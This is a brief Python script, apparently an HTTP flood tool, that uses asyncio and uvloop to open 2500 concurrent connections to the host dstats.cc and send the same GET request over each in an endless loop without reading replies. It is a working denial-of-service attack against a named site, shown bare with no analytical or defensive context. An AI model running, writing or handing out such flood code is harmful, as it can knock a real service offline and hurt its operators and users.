import asyncio

import uvloop

async def main():
    async def worker():
        reader, writer = await asyncio.open_connection("dstats.cc", 80)
        request = (
            b"GET / HTTP/1.1\r\n"
            b"Host: dstats.cc\r\n"
            b"Connection: keep-alive\r\n"
            b"\r\n"
        )
        while True:
            writer.write(request)
            await writer.drain()
    await asyncio.gather(*(worker() for _ in range(2500)))

uvloop.run(main())
